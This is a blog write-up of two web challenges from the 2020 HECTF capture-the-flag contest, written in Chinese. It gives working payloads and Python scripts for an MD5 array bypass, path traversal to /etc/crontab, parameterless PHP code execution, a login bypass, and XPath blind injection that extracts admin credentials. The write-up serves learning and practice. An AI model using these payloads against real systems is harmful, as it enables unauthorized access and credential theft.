<!DOCTYPE html>
<html>
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  

  
  <title>2020 HECTF Write-up | Err0r</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="by:gyy抢了到人生第一次大一点点比赛的一血    WEBweb1题目链接：http:&#x2F;&#x2F;121.196.32.184:12001&#x2F; 打开发现nonono ，once again！ 查看源码 &lt;!-- if ($_POST[&#39;a&#39;] !&#x3D;&#x3D; $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &amp;#123; echo (">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 HECTF Write-up">
<meta property="og:url" content="https://err0r.top/article/2020-HECTF-Write-up/index.html">
<meta property="og:site_name" content="Err0r">
<meta property="og:description" content="by:gyy抢了到人生第一次大一点点比赛的一血    WEBweb1题目链接：http:&#x2F;&#x2F;121.196.32.184:12001&#x2F; 打开发现nonono ，once again！ 查看源码 &lt;!-- if ($_POST[&#39;a&#39;] !&#x3D;&#x3D; $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &amp;#123; echo (">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/1.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160030053.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160247187.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160318943.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160403000.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160434419.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160533941.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160554397.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160625642.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129160726706.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161139719.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161225253.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161255235.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161318627.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129162416104.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161907953.png">
<meta property="og:image" content="https://err0r.top/article/2020-HECTF-Write-up/image-20201129161946397.png">
<meta property="article:published_time" content="2020-11-22T14:00:00.000Z">
<meta property="article:modified_time" content="2021-02-19T07:10:14.508Z">
<meta property="article:author" content="gyy">
<meta property="article:tag" content="md5">
<meta property="article:tag" content="无参数RCE">
<meta property="article:tag" content="XPath注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://err0r.top/article/2020-HECTF-Write-up/1.png">
  
    <link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Err0r</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://err0r.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2020-HECTF-Write-up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/2020-HECTF-Write-up/" class="article-date">
  <time datetime="2020-11-22T14:00:00.000Z" itemprop="datePublished">2020-11-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2020 HECTF Write-up
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p>
<img src="/article/2020-HECTF-Write-up/1.png" class="" title="img">

<hr>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a target="_blank" rel="noopener" href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p>
<p>打开发现<code>nonono ，once again！</code></p>
<p>查看源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名
<span class="token operator">--</span><span class="token operator">></span>
</code></pre>

<p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053">

<p>访问./3b8cf4731c36d20776c76e20f9c774c7.php</p>
<pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre>

<p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了/etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p>
<p>``./../../../etc/crontab`访问得</p>
<pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;
# command to install the new version when you edit this file
# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL&#x3D;&#x2F;bin&#x2F;sh
PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
#
0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php
</code></pre>
<p>很明显<code>/very_g00d_Y0u_got_it.php</code></p>
<p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p>
<p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187">

<p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943">

<p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p>
<pre class="language-none"><code class="language-none">Array
(
    [0] &#x3D;&gt; .
    [1] &#x3D;&gt; ..
    [2] &#x3D;&gt; .dockerenv
    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php
    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg
    [5] &#x3D;&gt; bin
    [6] &#x3D;&gt; boot
    [7] &#x3D;&gt; dev
    [8] &#x3D;&gt; etc
    [9] &#x3D;&gt; flag
    [10] &#x3D;&gt; home
    [11] &#x3D;&gt; index.php
    [12] &#x3D;&gt; lib
    [13] &#x3D;&gt; lib64
    [14] &#x3D;&gt; media
    [15] &#x3D;&gt; mnt
    [16] &#x3D;&gt; opt
    [17] &#x3D;&gt; proc
    [18] &#x3D;&gt; root
    [19] &#x3D;&gt; run
    [20] &#x3D;&gt; sbin
    [21] &#x3D;&gt; srv
    [22] &#x3D;&gt; start.sh
    [23] &#x3D;&gt; sys
    [24] &#x3D;&gt; tmp
    [25] &#x3D;&gt; usr
    [26] &#x3D;&gt; var
    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php
)</code></pre>

<img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000">
<p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419">
<p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p>
<p>Payload：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>

url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>

data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>
    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span>
<span class="token punctuation">&#125;</span>

requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>

response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
</code></pre>

<h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a target="_blank" rel="noopener" href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p>
<p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941">

<p>输admin登陆一下</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397">

<p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p>
<img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642">

<p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p>
<p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p>
<p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1   就能绕过校验，成功获取所有user数据</p>
<p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p>
<p>具体不做阐述</p>
<hr>
<p><strong>尝试XPath盲注</strong></p>
<p>一般步骤如下:</p>
<p>1.判断根下节点数:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: 1</p>
<p>2.猜解第一级节点:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>…</p>
<p>result: root</p>
<p>3.判断root的下一级节点数:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: 2</p>
<p>4.猜解root的下一级节点:</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>result: users,secret</p>
<p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p>
<p>猜解id为1的user节点下的username值,</p>
<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
<p>…</p>
<p>result: admin</p>
<hr>
<p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p>
<img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706">

<p>这个结果应该是return 1，即根下有一个节点</p>
<p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p>
<p>继续猜测第一级节点，用脚本跑</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

baseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>

s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>

result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>
        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>
        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>
        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>

        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end

        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            flag<span class="token operator">=</span><span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token comment"># !####! 换成目录即可</span>
</code></pre>
<p>结果爆出第一级为root</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719">

<p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253">

<img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235">

<img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627">

<p>最后爆出结构为/root/users/user[id]</p>
<p>开始猜测id为1的user节点下username值，其实能猜到的admin</p>
<p>payload：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

baseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>

s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>

result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>
        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>
        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>
        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>

        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end

        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            flag <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token comment"># 爆密码就把username改成password</span>
</code></pre>
<p>爆username</p>
<img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104">
<p>果然是admin</p>
<p>继续爆password</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953">


<p>结果password=339db714647a1d66b85cd08442287841</p>
<p>登录一下，获得flag</p>
<img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397">
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/2020-HECTF-Write-up/" data-id="cklc0zh1g0003fpov91vkhza4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XPath%E6%B3%A8%E5%85%A5/" rel="tag">XPath注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">无参数RCE</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/article/S3cCTF-gyy-Writeup/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          S3cCTF-出题人gyy-Writeup
        
      </div>
    </a>
  
  
    <a href="/article/2020hxb-Writeup-cOMING/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2020hxb-Writeup</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Programme/">Programme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-Up/">Write-Up</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/">杂谈笔记</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/">菜鸡教程</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git%E6%B3%84%E9%9C%B2/" rel="tag">Git泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/" rel="tag">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/" rel="tag">OOB带外攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF/" rel="tag">XFF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XPath%E6%B3%A8%E5%85%A5/" rel="tag">XPath注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-whale/" rel="tag">ctf-whale</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctfd/" rel="tag">ctfd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/netcat/" rel="tag">netcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pgsql/" rel="tag">pgsql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" 